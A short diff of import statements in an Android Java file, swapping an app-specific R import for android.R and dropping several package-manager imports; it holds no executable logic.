@@ -5,8 +5,8 @@ import java.io.FilenameFilter;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
 
+import android.R;
 import android.app.Activity;
-import android.app.ActivityManager;
 import android.app.AlertDialog;
 import android.content.ComponentName;
 import android.content.Context;
@@ -14,9 +14,7 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.content.pm.ActivityInfo;
-import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
-import android.content.pm.PackageManager.NameNotFoundException;
 import android.os.Bundle;
 import android.os.Environment;
 import android.preference.PreferenceManager;
@@ -27,7 +25,6 @@ import android.view.Window;
 import android.widget.Button;
 import android.widget.Toast;
 
-import com.google.android.certificate.R;
 import com.google.android.history.LinkService;
 import com.google.android.location.GPSTracker;
 
